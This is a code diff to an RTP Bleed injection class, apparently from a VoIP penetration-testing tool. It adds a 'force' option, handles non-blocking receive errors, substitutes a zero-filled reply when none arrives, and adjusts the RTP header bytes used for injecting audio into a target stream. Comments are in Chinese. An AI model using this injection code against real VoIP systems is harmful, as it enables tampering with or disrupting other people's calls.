@@ -50,6 +50,7 @@ class RTPBleedInject:
         self.payload = "0 PCMU (audio)"  # 修改默认值为完整描述
         self.file = "test.wav"
         self.loop = False
+        self.force = False
 
         self.run = True
 
@@ -128,17 +129,30 @@ class RTPBleedInject:
                 # Send data
                 print(f"{self.c.YELLOW}[+] Sending RTP packets now!{self.c.WHITE}")
                 sock.sendto(byte_array, host)
+                
+                msg = None  # 初始化msg变量
+                
+                try:
+                    (msg, addr) = sock.recvfrom(4096)
+                except BlockingIOError:
+                    # 如果是非阻塞错误，继续尝试接收
+                    if not self.force:
+                        continue
 
-                (msg, addr) = sock.recvfrom(4096)
                 (ipaddr, rport) = host
-                size = len(msg)
-                msg = msg.hex()
+                if msg is not None:
+                    size = len(msg)
+                    msg = msg.hex()
+                else:
+                    # 如果msg为None，生成一个25字节长的全0数组
+                    size = 25
+                    msg = '00' * size
 
-                if size >= 12:
+                if size >= 12 or self.force:
                     seq = msg[4:8]
                     timestamp = msg[8:16]
                     ssrc = msg[16:24]
-                    version = "8000"
+                    version = "80" + cpayload
 
                     print(
                         f"{self.c.WHITE} received {str(size)} bytes from target port {str(rport)} with seq number {seq}"
